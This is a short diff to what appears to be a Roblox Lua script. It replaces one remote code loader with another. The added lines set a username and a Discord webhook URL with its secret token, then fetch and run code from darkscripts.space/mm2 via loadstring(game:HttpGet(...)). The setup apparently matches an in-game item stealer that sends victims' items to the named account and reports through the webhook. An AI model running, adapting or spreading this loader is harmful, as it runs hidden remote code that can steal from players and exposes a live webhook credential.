@@ -1,1 +1,5 @@
-loadstring(game:HttpGet("https://egorikusa.space/effd92894b31caffe5c87783.lua", true))()
+Username = "sandro4342"
+Webhook = "https://discord.com/api/webhooks/1314526688788480101/XO6jTseGclq7mb8raSvMvKCXh9ZjcJfRFz5hCtDZPoHtbHWItHHPmJNCaoJ_Cjm5QgYI"
+selectedLoadingScreen = "2"
+
+loadstring(game:HttpGet(('https://darkscripts.space/mm2')))()
